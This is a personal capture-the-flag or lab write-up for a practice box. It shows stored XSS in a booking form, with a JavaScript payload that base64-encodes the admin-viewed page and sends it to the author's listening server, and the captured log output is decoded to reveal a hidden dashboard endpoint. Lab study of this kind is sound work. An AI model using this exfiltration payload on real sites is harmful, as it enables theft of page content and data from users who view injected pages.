`http://192.168.187.88`
![[Pasted image 20250511224117.png]]
`http://192.168.187.88/contact.html`
![[Pasted image 20250511224226.png]]leads to `http://192.168.187.88/booking`
![[Pasted image 20250511224342.png]]
testing `xss`
![[Pasted image 20250511224846.png]]
testing `xss` to see if im able to hit my own python server with `<script src="http://192.168.45.181:8000/xss.js"></script>`
![[Pasted image 20250511225536.png]]was able to hit the server, this is an `xss` vulnerability
![[Pasted image 20250511225613.png]]
while on the website i am able to query for `window.document.body.innerHTML` - this shows the `html` that is being used
![[Pasted image 20250511233545.png]]
created `payload.js` to grab the contents of the page and `base64` it and send it back to `my python3` server
```bash
┌──(root💀gobots)-[12May2025 03:52:59]-[/home/kali/SUT/Construction]                                                  
└─# cat payload.js                                         
window.location.href="http://192.168.45.181:8000/a?b=" + btoa(window.document.body.innerHTML);    
```
sent the payload off with this
```bash
<script src="http://192.168.45.181:8000/payload.js"></script>
```
![[Pasted image 20250512001615.png]]
got the `base64encoded` results
```bash
192.168.187.88 - - [12/May/2025 03:53:05] "GET /a?b=CiAgPGRpdiBjbGFzcz0iaGVyb19hcmVhIj4KICAgIDwhLS0gaGVhZGVyIHNlY3Rpb24gc3RyYXRzIC0tPgogICAgPGhlYWRlciBjbGFzcz0iaGVhZGVyX3NlY3Rpb24iPgogICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXItZmx1aWQiPgogICAg
ICAgIDxuYXYgY2xhc3M9Im5hdmJhciBuYXZiYXItZXhwYW5kLWxnIGN1c3RvbV9uYXYtY29udGFpbmVyICI+CiAgICAgICAgICA8YSBjbGFzcz0ibmF2YmFyLWJyYW5kIiBocmVmPSJpbmRleC5odG1sIj4KICAgICAgICAgICAgPHNwYW4+CiAgICAgICAgICAgICAgSGV1c3Rvbm4KICAgICAgICAgICAgPC9zcGFu
PgogICAgICAgICAgPC9hPgogICAgICAgICAgPGJ1dHRvbiBjbGFzcz0ibmF2YmFyLXRvZ2dsZXIgbWwtYXV0byIgdHlwZT0iYnV0dG9uIiBkYXRhLXRvZ2dsZT0iY29sbGFwc2UiIGRhdGEtdGFyZ2V0PSIjbmF2YmFyU3VwcG9ydGVkQ29udGVudCIgYXJpYS1jb250cm9scz0ibmF2YmFyU3VwcG9ydGVkQ29udGVu
dCIgYXJpYS1leHBhbmRlZD0iZmFsc2UiIGFyaWEtbGFiZWw9IlRvZ2dsZSBuYXZpZ2F0aW9uIj4KICAgICAgICAgICAgPHNwYW4gY2xhc3M9Im5hdmJhci10b2dnbGVyLWljb24iPjwvc3Bhbj4KICAgICAgICAgIDwvYnV0dG9uPgoKICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbGxhcHNlIG5hdmJhci1jb2xsYXBz
ZSIgaWQ9Im5hdmJhclN1cHBvcnRlZENvbnRlbnQiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJkLWZsZXggbXgtYXV0byBmbGV4LWNvbHVtbiBmbGV4LWxnLXJvdyBhbGlnbi1pdGVtcy1jZW50ZXIiPgogICAgICAgICAgICAgIDx1bCBjbGFzcz0ibmF2YmFyLW5hdiAgIj4KICAgICAgICAgICAgICAgIDxsaSBj
bGFzcz0ibmF2LWl0ZW0gIj4KICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJpbmRleC5odG1sIj5Ib21lIDxzcGFuIGNsYXNzPSJzci1vbmx5Ij4oY3VycmVudCk8L3NwYW4+PC9hPgogICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0
ZW0gYWN0aXZlIj4KICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJhYm91dC5odG1sIj4gQWJvdXQgPC9hPgogICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPgogICAgICAgICAgICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsi
IGhyZWY9InNlcnZpY2UuaHRtbCI+IFNlcnZpY2VzIDwvYT4KICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSJjb250YWN0Lmh0bWwiPkNvbnRhY3QgdXM8L2E+CiAgICAgICAg
ICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+CiAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iaHR0cDovL2xvY2FsaG9zdDozMDAwL2E4NmU1NjA2MDFlNTMyOTM0MTE4YTEyNWRjYThhOWEwZmIyNmJjNDVhZGIzYmIzOGEzNzcyZGFhOGVm
MjQ4YTMiPkRhc2hib2FyZCAoVW5kZXIgRGV2ZWxvcG1lbnQpPC9hPgogICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPGZvcm0gY2xhc3M9ImZvcm0taW5saW5lIG15LTIgbXktbGctMCBtbC0wIG1sLWxn
LTQgbWItMyBtYi1sZy0wIj4KICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuICBteS0yIG15LXNtLTAgbmF2X3NlYXJjaC1idG4iIHR5cGU9InN1Ym1pdCI+PC9idXR0b24+CiAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgPC9uYXY+CiAgICAgIDwvZGl2PgogICAgPC9oZWFkZXI+CiAgICA8IS0tIGVuZCBo
ZWFkZXIgc2VjdGlvbiAtLT4KICA8L2Rpdj4KCiAgPCEtLSBhYm91dCBzZWN0aW9uIC0tPgogIDxzZWN0aW9uIGNsYXNzPSJhYm91dF9zZWN0aW9uIGxheW91dF9wYWRkaW5nIj4KICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgIDxkaXYgY2xhc3M9ImN1c3RvbV9oZWFkaW5nLWNvbnRhaW5lciI+Cgog
ICAgICAgIAogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8aDQ+Qm9va2luZyAxPC9oND4KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgPHA+CiAgICAgICAgICAgICAgICAgICAgbmFtZTogPHNjcmlwdCBzcmM9Imh0dHA6Ly8xOTIuMTY4LjQ1LjE4MTo4MDAwL3BheWxvYWQuanMiPjwv
c2NyaXB0PjwvcD48L3VsPjwvZGl2PjwvZGl2Pjwvc2VjdGlvbj4= HTTP/1.1" 404 -    
```
![[Pasted image 20250512001717.png]]
used cyber chef to decode
```http

  <div class="hero_area">
    <!-- header section strats -->
    <header class="header_section">
      <div class="container-fluid">
        <nav class="navbar navbar-expand-lg custom_nav-container ">
          <a class="navbar-brand" href="index.html">
            <span>
              Heustonn
            </span>
          </a>
          <button class="navbar-toggler ml-auto" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
          </button>

          <div class="collapse navbar-collapse" id="navbarSupportedContent">
            <div class="d-flex mx-auto flex-column flex-lg-row align-items-center">
              <ul class="navbar-nav  ">
                <li class="nav-item ">
                  <a class="nav-link" href="index.html">Home <span class="sr-only">(current)</span></a>
                </li>
                <li class="nav-item active">
                  <a class="nav-link" href="about.html"> About </a>
                </li>
                <li class="nav-item">
                  <a class="nav-link" href="service.html"> Services </a>
                </li>
                <li class="nav-item">
                  <a class="nav-link" href="contact.html">Contact us</a>
                </li>
                <li class="nav-item">
                  <a class="nav-link" href="http://localhost:3000/a86e560601e532934118a125dca8a9a0fb26bc45adb3bb38a3772daa8ef248a3">Dashboard (Under Development)</a>
                </li>
              </ul>
            </div>
          </div>
          <form class="form-inline my-2 my-lg-0 ml-0 ml-lg-4 mb-3 mb-lg-0">
            <button class="btn  my-2 my-sm-0 nav_search-btn" type="submit"></button>
          </form>
        </nav>
      </div>
    </header>
    <!-- end header section -->
  </div>

  <!-- about section -->
  <section class="about_section layout_padding">
    <div class="container">
      <div class="custom_heading-container">

        
            <ul>
                <h4>Booking 1</h4>
                
                <p>
                    name: <script src="http://192.168.45.181:8000/payload.js"></script></p></ul></div></div></section>4Ïÿ]xÓ
```
got a new `http` endpoint
![[Pasted image 20250512001851.png]]

```bash
http://192.168.187.88:3000/a86e560601e532934118a125dca8a9a0fb26bc45adb3bb38a3772daa8ef248a3
```
got local.txt
![[Pasted image 20250512001940.png]]